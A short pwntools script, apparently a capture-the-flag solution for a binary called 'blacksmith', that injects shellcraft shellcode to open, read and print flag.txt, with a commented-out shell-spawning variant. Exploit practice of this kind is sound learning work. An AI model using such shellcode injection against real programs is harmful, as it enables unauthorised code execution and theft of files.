from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

exe = './blacksmith'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

sh = start()

# we are using shellcraft, because it's just executing code.
#shellcode = asm(shellcraft.sh())
shellcode = asm(shellcraft.open('flag.txt'))
# ssize_t read(int fildes, void *buf, size_t nbyte);
# int fildes value -> 3, because we want to read from a file | check linux man pages -> die.net (num2 - read)
# void*buf -> rsp, because we want to read it to the stack
# size_t nbyte -> since the flag won't be too long, input any bytes size.
shellcode += asm(shellcraft.read(3, 'rsp', 50))
# ssize_t write(int fildes, const void *buf, size_t nbyte);
# int fildes -> 1 , because we want to send message to out standard output (another user) | check linux man pages -> die.net (num1 - write)
shellcode += asm(shellcraft.write(1, 'rsp', 'rax'))

sh.sendlineafter('>', '1')
sh.sendlineafter('>', '2')
sh.sendlineafter('>', flat(shellcode))

# Need to add these lines of script, dunno why if exclude it, won't get the flag.
sh.recv()
#sh.interactive()
getFlag = sh.recv()
success(getFlag)
